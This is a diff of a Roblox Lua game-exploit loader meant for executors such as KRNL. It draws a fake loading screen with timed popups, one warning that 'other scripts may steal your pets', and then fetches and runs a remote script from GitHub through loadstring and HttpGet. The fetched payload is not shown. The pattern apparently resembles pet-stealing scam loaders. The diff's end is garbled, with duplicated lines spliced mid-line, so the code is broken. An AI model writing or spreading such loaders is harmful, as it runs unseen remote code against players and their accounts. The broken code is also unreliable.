@@ -6,13 +6,14 @@ local Player = Players.LocalPlayer
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 ScreenGui.ResetOnSpawn = false
 
--- "UPDATED." POPUP (Changed)
+-- "UPDATED." POPUP (Merged and Fixed)
 local UpdatedPopup = Instance.new("TextLabel", ScreenGui)
 UpdatedPopup.AnchorPoint = Vector2.new(0.5, 0.5)
 UpdatedPopup.Position = UDim2.new(0.5, 0, 0.5, 0)
 UpdatedPopup.Size = UDim2.new(0, 450, 0, 60)
-UpdatedPopup.Text = "Not working on Delta right now, use KRNL"
+UpdatedPopup.Text = "Not working on Delta right now, use KRNL | Only works on public server"
 UpdatedPopup.TextScaled = true
+UpdatedPopup.TextWrapped = true
 UpdatedPopup.Font = Enum.Font.GothamBlack
 UpdatedPopup.TextColor3 = Color3.new(1, 1, 1)
 UpdatedPopup.BackgroundColor3 = Color3.fromRGB(180, 0, 30)
@@ -26,13 +27,10 @@ Stroke.Color = Color3.fromRGB(255, 80, 80)
 Stroke.Thickness = 2
 Stroke.Transparency = 0.3
 
--- Fade out after 4.5 seconds (changed)
-task.delay(4.5, function()
+-- Fade out after 4.5 seconds (unchanged)
+task.delay(7.5, function()
     UpdatedPopup:Destroy()
     
-    -- MAIN LOADER STARTS
-    -- (your loader code here stays the same)
-
     -- MAIN LOADER STARTS
     local Frame = Instance.new("Frame", ScreenGui)
     Frame.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -132,6 +130,23 @@ task.delay(4.5, function()
         msg1.Text = "❗ If it doesn’t work, rejoin and try again. Too many users may bug it."
         msg1.TextScaled = true
         msg1.Font = Enum.Font.GothamBold
+        msg1.TextColor3 = Color3.new(1, 1, 1)
+        msg1.BackgroundColor3 = Color3.new(0, 0, 0)
+        msg1.BackgroundTransparency = 0.3
+        msg1.BorderSizePixel = 0
+
+        task.delay(5, function()
+            msg1:Destroy()
+            local msg2 = msg1:Clone()
+            msg2.Text = "⚠️ Beware of other scripts — they may steal your pets!"
+            msg2.Parent = ScreenGui
+            task.delay(5, function()
+                msg2:Destroy()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Makuscripts/3in1/refs/heads/main/3in1"))()
+            end)
+        end)
+    end)
+end)        msg1.Font = Enum.Font.GothamBold
         msg1.TextColor3 = Color3.new(1, 1, 1)
         msg1.BackgroundColor3 = Color3.new(0, 0, 0)
         msg1.BackgroundTransparency = 0.3
